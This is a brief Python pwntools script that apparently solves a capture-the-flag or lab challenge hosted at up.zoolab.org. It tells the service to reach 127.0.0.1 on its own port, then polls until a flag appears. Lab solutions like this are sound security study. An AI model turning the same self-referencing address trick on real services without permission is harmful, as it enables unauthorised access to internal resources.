from pwn import *
import os
import time

r = remote('up.zoolab.org', 10932)

r.recvuntil(b'?').decode()
r.sendline(b'g')
r.sendline(b'1/10000')
r.recvuntil(b'?').decode()
r.sendline(b'g')
r.sendline(b'127.0.0.1/10932')
r.recvuntil(b'?').decode()
while True:
    r.sendline(b'v')
    rec = r.recvuntil(b'?').decode()
    if 'FLAG' in rec:
        print(rec, end='')
        break
    time.sleep(5)
r.close()
